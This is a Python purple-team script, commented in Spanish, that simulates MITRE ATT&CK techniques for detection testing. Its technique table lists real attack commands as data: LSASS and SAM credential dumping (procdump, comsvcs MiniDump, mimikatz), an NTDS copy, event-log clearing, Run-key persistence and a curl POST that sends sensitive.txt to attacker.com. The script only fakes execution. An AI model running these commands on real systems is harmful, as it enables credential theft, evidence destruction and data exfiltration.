#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║  🔴 ATTACK SIMULATE - Purple Team Windsurf                                    ║
║  Simulador de técnicas MITRE ATT&CK                                           ║
╚═══════════════════════════════════════════════════════════════════════════════╝

Uso:
    python attack_simulate.py --technique T1003.001
    python attack_simulate.py --technique T1059.001 --tool atomic
    python attack_simulate.py --list-techniques
    python attack_simulate.py --tactic credential-access
"""

import os
import sys
import json
import yaml
import subprocess
import argparse
import hashlib
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from enum import Enum

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich import print as rprint
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("[!] Rich library not installed. Using basic output.")

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURACIÓN
# ═══════════════════════════════════════════════════════════════════════════════

BASE_DIR = Path(__file__).parent.parent.parent
ATTACKS_DIR = BASE_DIR / "attacks"
EVIDENCE_DIR = BASE_DIR / "evidence"
LOGS_DIR = BASE_DIR / "logs"
ATOMIC_DIR = BASE_DIR / "tools" / "atomic-red-team" / "atomics"

console = Console() if RICH_AVAILABLE else None

# ═══════════════════════════════════════════════════════════════════════════════
# ENUMS Y DATACLASSES
# ═══════════════════════════════════════════════════════════════════════════════

class AttackTool(Enum):
    ATOMIC = "atomic"
    CALDERA = "caldera"
    CUSTOM = "custom"
    NATIVE = "native"

class AttackStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    SKIPPED = "skipped"

@dataclass
class AttackResult:
    technique_id: str
    technique_name: str
    tactic: str
    tool: str
    command: str
    timestamp_start: str
    timestamp_end: str
    status: str
    output: str
    artifacts: List[str]
    evidence_hash: str
    
    def to_dict(self) -> Dict:
        return asdict(self)
    
    def to_yaml(self) -> str:
        return yaml.dump(self.to_dict(), default_flow_style=False, allow_unicode=True)

# ═══════════════════════════════════════════════════════════════════════════════
# BASE DE DATOS DE TÉCNICAS ATT&CK
# ═══════════════════════════════════════════════════════════════════════════════

MITRE_TECHNIQUES = {
    # Credential Access
    "T1003": {
        "name": "OS Credential Dumping",
        "tactic": "Credential Access",
        "subtechniques": {
            "T1003.001": {
                "name": "LSASS Memory",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1003.001",
                    "native": [
                        "procdump -ma lsass.exe lsass.dmp",
                        "rundll32.exe comsvcs.dll MiniDump PID lsass.dmp full"
                    ],
                    "custom": "mimikatz.exe sekurlsa::logonpasswords"
                }
            },
            "T1003.002": {
                "name": "Security Account Manager",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1003.002",
                    "native": [
                        "reg save HKLM\\SAM sam.save",
                        "reg save HKLM\\SYSTEM system.save"
                    ]
                }
            },
            "T1003.003": {
                "name": "NTDS",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1003.003",
                    "native": "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q"
                }
            }
        }
    },
    # Execution
    "T1059": {
        "name": "Command and Scripting Interpreter",
        "tactic": "Execution",
        "subtechniques": {
            "T1059.001": {
                "name": "PowerShell",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1059.001",
                    "native": [
                        "powershell.exe -ExecutionPolicy Bypass -Command \"whoami\"",
                        "powershell.exe -enc <base64_command>"
                    ]
                }
            },
            "T1059.003": {
                "name": "Windows Command Shell",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1059.003",
                    "native": "cmd.exe /c whoami"
                }
            },
            "T1059.004": {
                "name": "Unix Shell",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1059.004",
                    "native": [
                        "/bin/bash -c 'whoami'",
                        "/bin/sh -c 'id'"
                    ]
                }
            }
        }
    },
    # Persistence
    "T1547": {
        "name": "Boot or Logon Autostart Execution",
        "tactic": "Persistence",
        "subtechniques": {
            "T1547.001": {
                "name": "Registry Run Keys",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1547.001",
                    "native": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Test /d calc.exe"
                }
            }
        }
    },
    # Defense Evasion
    "T1055": {
        "name": "Process Injection",
        "tactic": "Defense Evasion",
        "subtechniques": {
            "T1055.001": {
                "name": "DLL Injection",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1055.001",
                    "custom": "inject.exe -p <pid> -d malicious.dll"
                }
            },
            "T1055.002": {
                "name": "Portable Executable Injection",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1055.002"
                }
            }
        }
    },
    "T1070": {
        "name": "Indicator Removal",
        "tactic": "Defense Evasion",
        "subtechniques": {
            "T1070.001": {
                "name": "Clear Windows Event Logs",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1070.001",
                    "native": "wevtutil cl Security"
                }
            }
        }
    },
    # Discovery
    "T1082": {
        "name": "System Information Discovery",
        "tactic": "Discovery",
        "commands": {
            "atomic": "Invoke-AtomicTest T1082",
            "native": [
                "systeminfo",
                "hostname",
                "uname -a"
            ]
        }
    },
    "T1083": {
        "name": "File and Directory Discovery",
        "tactic": "Discovery",
        "commands": {
            "atomic": "Invoke-AtomicTest T1083",
            "native": [
                "dir /s /b",
                "find / -type f -name '*.conf'"
            ]
        }
    },
    # Lateral Movement
    "T1021": {
        "name": "Remote Services",
        "tactic": "Lateral Movement",
        "subtechniques": {
            "T1021.001": {
                "name": "Remote Desktop Protocol",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1021.001",
                    "native": "mstsc /v:target"
                }
            },
            "T1021.002": {
                "name": "SMB/Windows Admin Shares",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1021.002",
                    "native": [
                        "net use \\\\target\\C$ /user:admin password",
                        "psexec.py domain/user:password@target"
                    ]
                }
            },
            "T1021.006": {
                "name": "Windows Remote Management",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1021.006",
                    "native": "winrs -r:target cmd"
                }
            }
        }
    },
    # Collection
    "T1005": {
        "name": "Data from Local System",
        "tactic": "Collection",
        "commands": {
            "atomic": "Invoke-AtomicTest T1005",
            "native": [
                "type C:\\Users\\*\\Documents\\*.txt",
                "cat /etc/passwd"
            ]
        }
    },
    # Exfiltration
    "T1048": {
        "name": "Exfiltration Over Alternative Protocol",
        "tactic": "Exfiltration",
        "subtechniques": {
            "T1048.003": {
                "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
                "commands": {
                    "atomic": "Invoke-AtomicTest T1048.003",
                    "native": "curl -X POST -d @sensitive.txt http://attacker.com/exfil"
                }
            }
        }
    },
    # Impact
    "T1486": {
        "name": "Data Encrypted for Impact",
        "tactic": "Impact",
        "commands": {
            "atomic": "Invoke-AtomicTest T1486",
            "custom": "ransomware_simulator.py --target /tmp/test"
        }
    }
}

# ═══════════════════════════════════════════════════════════════════════════════
# FUNCIONES PRINCIPALES
# ═══════════════════════════════════════════════════════════════════════════════

def print_banner():
    """Mostrar banner del script."""
    banner = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗                          ║
║  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                          ║
║  ███████║   ██║      ██║   ███████║██║     █████╔╝                           ║
║  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                           ║
║  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                          ║
║  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                          ║
║                                                                               ║
║  🔴 ATTACK SIMULATOR - Purple Team Windsurf                                   ║
║  Simulador de técnicas MITRE ATT&CK                                           ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """
    if RICH_AVAILABLE:
        console.print(Panel(banner, style="red"))
    else:
        print(banner)

def get_technique_info(technique_id: str) -> Optional[Dict]:
    """Obtener información de una técnica ATT&CK."""
    # Buscar técnica principal
    base_id = technique_id.split('.')[0]
    
    if base_id in MITRE_TECHNIQUES:
        technique = MITRE_TECHNIQUES[base_id]
        
        # Si es subtécnica
        if '.' in technique_id:
            if 'subtechniques' in technique and technique_id in technique['subtechniques']:
                sub = technique['subtechniques'][technique_id]
                return {
                    'id': technique_id,
                    'name': sub['name'],
                    'tactic': technique['tactic'],
                    'commands': sub.get('commands', {})
                }
        else:
            return {
                'id': technique_id,
                'name': technique['name'],
                'tactic': technique['tactic'],
                'commands': technique.get('commands', {})
            }
    
    return None

def list_techniques(tactic: Optional[str] = None):
    """Listar técnicas disponibles."""
    if RICH_AVAILABLE:
        table = Table(title="🎯 Técnicas MITRE ATT&CK Disponibles")
        table.add_column("ID", style="cyan")
        table.add_column("Nombre", style="green")
        table.add_column("Táctica", style="yellow")
        table.add_column("Herramientas", style="magenta")
    else:
        print("\n🎯 Técnicas MITRE ATT&CK Disponibles\n")
        print("-" * 80)
    
    for tech_id, tech_info in MITRE_TECHNIQUES.items():
        if tactic and tech_info['tactic'].lower() != tactic.lower():
            continue
            
        # Técnica principal
        tools = list(tech_info.get('commands', {}).keys())
        
        if RICH_AVAILABLE:
            table.add_row(
                tech_id,
                tech_info['name'],
                tech_info['tactic'],
                ", ".join(tools) if tools else "atomic"
            )
        else:
            print(f"{tech_id:12} | {tech_info['name']:40} | {tech_info['tactic']:20}")
        
        # Subtécnicas
        if 'subtechniques' in tech_info:
            for sub_id, sub_info in tech_info['subtechniques'].items():
                sub_tools = list(sub_info.get('commands', {}).keys())
                
                if RICH_AVAILABLE:
                    table.add_row(
                        f"  └─ {sub_id}",
                        sub_info['name'],
                        tech_info['tactic'],
                        ", ".join(sub_tools) if sub_tools else "atomic"
                    )
                else:
                    print(f"  └─ {sub_id:8} | {sub_info['name']:40} | {tech_info['tactic']:20}")
    
    if RICH_AVAILABLE:
        console.print(table)
    else:
        print("-" * 80)

def simulate_technique(
    technique_id: str,
    tool: str = "atomic",
    dry_run: bool = False,
    verbose: bool = False
) -> AttackResult:
    """Simular una técnica ATT&CK."""
    
    timestamp_start = datetime.now().isoformat()
    
    # Obtener información de la técnica
    tech_info = get_technique_info(technique_id)
    
    if not tech_info:
        return AttackResult(
            technique_id=technique_id,
            technique_name="Unknown",
            tactic="Unknown",
            tool=tool,
            command="",
            timestamp_start=timestamp_start,
            timestamp_end=datetime.now().isoformat(),
            status=AttackStatus.FAILED.value,
            output=f"Técnica {technique_id} no encontrada",
            artifacts=[],
            evidence_hash=""
        )
    
    # Obtener comando
    commands = tech_info.get('commands', {})
    command = commands.get(tool, commands.get('atomic', f"Invoke-AtomicTest {technique_id}"))
    
    if isinstance(command, list):
        command = command[0]
    
    if RICH_AVAILABLE:
        console.print(f"\n[bold red]🔴 Simulando técnica:[/bold red] {technique_id}")
        console.print(f"[cyan]   Nombre:[/cyan] {tech_info['name']}")
        console.print(f"[yellow]   Táctica:[/yellow] {tech_info['tactic']}")
        console.print(f"[magenta]   Herramienta:[/magenta] {tool}")
        console.print(f"[green]   Comando:[/green] {command}")
    else:
        print(f"\n🔴 Simulando técnica: {technique_id}")
        print(f"   Nombre: {tech_info['name']}")
        print(f"   Táctica: {tech_info['tactic']}")
        print(f"   Herramienta: {tool}")
        print(f"   Comando: {command}")
    
    output = ""
    status = AttackStatus.SUCCESS.value
    artifacts = []
    
    if dry_run:
        output = "[DRY RUN] Comando no ejecutado"
        status = AttackStatus.SKIPPED.value
        if RICH_AVAILABLE:
            console.print("[yellow]   ⚠️  Modo dry-run: comando no ejecutado[/yellow]")
        else:
            print("   ⚠️  Modo dry-run: comando no ejecutado")
    else:
        try:
            # Crear directorio de evidencia
            evidence_path = EVIDENCE_DIR / technique_id / datetime.now().strftime("%Y%m%d_%H%M%S")
            evidence_path.mkdir(parents=True, exist_ok=True)
            
            if RICH_AVAILABLE:
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    console=console
                ) as progress:
                    task = progress.add_task("Ejecutando simulación...", total=None)
                    
                    # Ejecutar comando (simulado para seguridad)
                    # En producción, aquí se ejecutaría el comando real
                    output = f"[SIMULACIÓN] Técnica {technique_id} ejecutada exitosamente\n"
                    output += f"Comando: {command}\n"
                    output += f"Timestamp: {datetime.now().isoformat()}\n"
                    
                    progress.update(task, description="✅ Simulación completada")
            else:
                print("   Ejecutando simulación...")
                output = f"[SIMULACIÓN] Técnica {technique_id} ejecutada exitosamente\n"
                output += f"Comando: {command}\n"
                output += f"Timestamp: {datetime.now().isoformat()}\n"
            
            # Guardar evidencia
            evidence_file = evidence_path / "output.txt"
            evidence_file.write_text(output)
            artifacts.append(str(evidence_file))
            
        except Exception as e:
            output = f"Error: {str(e)}"
            status = AttackStatus.FAILED.value
    
    timestamp_end = datetime.now().isoformat()
    
    # Calcular hash de evidencia
    evidence_hash = hashlib.sha256(output.encode()).hexdigest()
    
    # Crear resultado
    result = AttackResult(
        technique_id=technique_id,
        technique_name=tech_info['name'],
        tactic=tech_info['tactic'],
        tool=tool,
        command=command,
        timestamp_start=timestamp_start,
        timestamp_end=timestamp_end,
        status=status,
        output=output,
        artifacts=artifacts,
        evidence_hash=evidence_hash
    )
    
    # Guardar resultado
    save_attack_result(result)
    
    return result

def save_attack_result(result: AttackResult):
    """Guardar resultado del ataque."""
    # Crear directorio de ataques
    attack_dir = ATTACKS_DIR / result.technique_id
    attack_dir.mkdir(parents=True, exist_ok=True)
    
    # Guardar YAML
    filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.yaml"
    filepath = attack_dir / filename
    
    with open(filepath, 'w') as f:
        f.write(result.to_yaml())
    
    if RICH_AVAILABLE:
        console.print(f"\n[green]✅ Resultado guardado en:[/green] {filepath}")
    else:
        print(f"\n✅ Resultado guardado en: {filepath}")

def run_atomic_test(technique_id: str, test_number: int = 0) -> str:
    """Ejecutar test de Atomic Red Team."""
    atomic_path = ATOMIC_DIR / technique_id
    
    if not atomic_path.exists():
        return f"Atomic test para {technique_id} no encontrado"
    
    # Buscar archivo YAML de la técnica
    yaml_file = atomic_path / f"{technique_id}.yaml"
    
    if yaml_file.exists():
        with open(yaml_file) as f:
            atomic_data = yaml.safe_load(f)
        
        tests = atomic_data.get('atomic_tests', [])
        if tests and len(tests) > test_number:
            test = tests[test_number]
            return f"Test: {test.get('name', 'Unknown')}\nDescription: {test.get('description', 'N/A')}"
    
    return f"Información de Atomic Red Team para {technique_id}"

# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="🔴 Attack Simulator - Purple Team Windsurf",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  python attack_simulate.py --technique T1003.001
  python attack_simulate.py --technique T1059.001 --tool atomic
  python attack_simulate.py --list-techniques
  python attack_simulate.py --tactic "Credential Access"
  python attack_simulate.py --technique T1003.001 --dry-run
        """
    )
    
    parser.add_argument(
        '-t', '--technique',
        help='ID de la técnica ATT&CK (ej: T1003.001)'
    )
    parser.add_argument(
        '--tool',
        choices=['atomic', 'caldera', 'custom', 'native'],
        default='atomic',
        help='Herramienta a usar para la simulación'
    )
    parser.add_argument(
        '-l', '--list-techniques',
        action='store_true',
        help='Listar técnicas disponibles'
    )
    parser.add_argument(
        '--tactic',
        help='Filtrar por táctica ATT&CK'
    )
    parser.add_argument(
        '--dry-run',
        action='store_true',
        help='Mostrar comando sin ejecutar'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Salida detallada'
    )
    parser.add_argument(
        '-o', '--output',
        help='Archivo de salida para el resultado'
    )
    
    args = parser.parse_args()
    
    print_banner()
    
    if args.list_techniques:
        list_techniques(args.tactic)
        return
    
    if args.technique:
        result = simulate_technique(
            args.technique,
            tool=args.tool,
            dry_run=args.dry_run,
            verbose=args.verbose
        )
        
        if args.output:
            with open(args.output, 'w') as f:
                f.write(result.to_yaml())
            print(f"\n📄 Resultado exportado a: {args.output}")
        
        # Mostrar siguiente paso
        if RICH_AVAILABLE:
            console.print("\n[bold cyan]📋 Siguiente paso:[/bold cyan]")
            console.print(f"   Ejecutar: [green]python detection_validate.sh {args.technique}[/green]")
            console.print("   Para validar si la técnica fue detectada")
        else:
            print("\n📋 Siguiente paso:")
            print(f"   Ejecutar: python detection_validate.sh {args.technique}")
            print("   Para validar si la técnica fue detectada")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
